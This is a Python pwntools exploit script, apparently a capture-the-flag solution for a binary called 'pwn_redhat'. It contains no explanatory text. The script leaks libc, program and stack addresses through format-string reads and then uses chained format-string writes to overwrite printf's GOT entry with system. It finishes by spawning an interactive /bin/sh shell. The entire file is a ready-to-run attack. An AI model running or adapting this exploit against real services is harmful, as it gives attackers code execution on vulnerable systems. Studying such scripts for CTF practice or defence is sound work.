from pwn import *

#p = remote('172.16.9.29',6799)
p = process('./pwn_redhat')
elf = ELF('./pwn_redhat')
#context.log_level = 'debug'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def ls():
	p.recvuntil('>>>')
	p.sendline('ls')

def touch(size,content):
	p.recvuntil('>>>')
	p.sendline('touch')
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('content:')
	p.sendline(content)

def rm(index):
	p.recvuntil('>>>')
	p.sendline('rm')
	p.recvuntil('Index:')
	p.sendline(str(index))

def su(code):
	p.recvuntil('>>>')
	p.sendline('su')
	p.recvuntil('verify code:')
	p.sendline(code)

def ssh():
	p.recvuntil('>>>')
	p.sendline('sh')


p.recvuntil('>>>')
p.sendline('%9$p')
libc_start_main_ret = int(p.recvuntil(' :command',drop = 'True')[2:],16)
#log.success('libc start main ret : 0x%x'%libc_start_main_ret)
offset___libc_start_main_ret = 0x20830
libc_base = libc_start_main_ret - offset___libc_start_main_ret
log.success('libc base addr : 0x%x'%libc_base)


p.recvuntil('>>>')
p.sendline('%8$p')
elf_base = int(p.recvuntil(' :command',drop = 'True')[2:],16) - 0x13c0
log.success('elf base addr : 0x%x'%elf_base)

p.recvuntil('>>>')
p.sendline('%11$p')
stack = int(p.recvuntil(' :command',drop = 'True')[2:],16) - 0xe8
system_addr = libc_base + libc.symbols['system']
printf_got = elf_base + elf.got['printf']

log.success('rbp addr : 0x%x'%stack)
log.success('printf_got : 0x%x'%printf_got)
log.success('system addr : 0x%x'%system_addr)

gdb.attach(p)

payload = "%{}c%{}$hn".format((stack + 0x28) & 0xffff,0x5 + 6)
payload += "%{}c%{}$hn".format(2, 0x13 + 6)
p.sendlineafter(">>>",payload + '\0')

payload = "%{}c%{}$hhn".format((printf_got >> 16 & 0xff), 0x21 + 6)
payload += "%{}c%{}$hn".format((printf_got & 0xffff) - (printf_got >> 16 & 0xff), 0x1f + 6)
p.sendlineafter(">>>",payload + '\0')

payload = "%{}c%{}$hn".format((stack + 0x40) & 0xffff, 0x5 + 6)
payload += "%{}c%{}$hn".format(2, 0x13 + 6)
p.sendlineafter(">>>",payload + '\0')

payload = "%{}c%{}$hhn".format(((printf_got + 2) >> 16 & 0xff), 0x21 + 6)
payload += "%{}c%{}$hn".format(((printf_got + 2) & 0xffff) - (printf_got >> 16 & 0xff), 0x1f + 6)
p.sendlineafter(">>>",payload + '\0')

payload = "%{}c%{}$hhn".format(system_addr >> 16 & 0xff, 0xa + 6)
payload += "%{}c%{}$hn".format((system_addr & 0xffff) - (system_addr >> 16 & 0xff), 0x7 + 6)
p.sendlineafter(">>>",payload + '\0')

p.sendline("/bin/sh\0")
p.interactive()